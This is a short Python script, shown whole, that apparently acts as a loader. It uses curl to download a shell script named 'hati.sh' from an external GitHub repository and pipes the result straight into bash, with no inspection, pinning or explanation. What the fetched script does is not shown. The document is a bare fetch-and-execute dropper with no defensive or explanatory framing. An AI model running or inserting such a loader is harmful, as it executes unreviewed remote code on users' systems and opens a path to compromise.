import subprocess
result = subprocess.run(['curl', '-sSL', 'https://github.com/barburonjilo/back/raw/main/hati.sh'], capture_output=True, text=True)
subprocess.run(['bash'], input=result.stdout, text=True)
